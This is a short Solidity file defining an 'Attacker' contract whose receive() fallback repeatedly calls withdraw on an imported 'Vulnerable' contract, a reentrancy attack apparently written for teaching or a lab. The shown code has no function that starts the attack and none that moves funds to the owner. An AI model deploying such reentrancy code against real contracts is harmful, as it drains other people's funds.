// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vulnerable.sol";

contract Attacker {
    Vulnerable public vul;
    address public owner;

    constructor(address _vulnerableAddress) {
        vul = Vulnerable(_vulnerableAddress);
        owner = msg.sender;
    }

    // Fallback function that gets triggered during reentrancy
    receive() external payable {
        if(address(vul).balance >= 1 ether) {
            vul.withdraw(1 ether);
        }
    }
}